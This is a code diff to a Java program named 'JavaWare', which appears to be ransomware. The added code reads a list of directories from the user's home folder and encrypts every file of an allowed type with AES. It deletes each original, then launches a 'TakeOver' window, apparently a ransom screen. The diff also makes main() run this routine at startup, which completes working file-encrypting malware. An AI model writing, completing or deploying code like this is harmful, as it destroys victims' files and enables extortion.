@@ -25,6 +25,8 @@ import javafx.application.Application;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
+import java.nio.file.Files;
+import java.util.*;
 
 public class JavaWare {
 
@@ -36,26 +38,34 @@ public class JavaWare {
 
     public void EncryptFiles() throws Exception{
         FindFiles ff = new FindFiles();
-        long startTime = System.nanoTime();
         ff.FindFiles();
-        long endTime = System.nanoTime();
 
-        System.out.println("Time: " + (endTime - startTime));
-        System.out.println(ff.count);
-
-
-        /*
-        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "output.txt"));
+        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "directory.txt"));
         String line = reader.readLine();
+
         while(line != null) {
-            //System.out.println(line);
-            File file = new File(line);
-            aes.encrypt(file);
-            file.delete();
+            File directory = new File(line);
+            File[] files = directory.listFiles();
+
+            for(File f: files) {
+               if(f.isFile()) {
+                   int index = f.getName().lastIndexOf(".");
+                   String fileType = f.getName().substring(index + 1);
+
+                   //if file extension is allowed, encrypt file
+                   FileTypes FileTypes = new FileTypes();
+                   if(FileTypes.AllowedTypes.contains("." + fileType.toUpperCase())) {
+                       aes.encrypt(f);
+                       f.delete();
+                       System.out.println("Encrypting "+ f);
+                   }
+               }
+
+            }
             //read next line
             line = reader.readLine();
         }
-        reader.close();*/
+        reader.close();
         Application.launch(TakeOver.class, "JavaWare");
     }
 
@@ -88,7 +98,7 @@ public class JavaWare {
 
     public static void main(String[] args) throws Exception {
         JavaWare jw = new JavaWare();
-
+        jw.EncryptFiles();
 
     }
 }
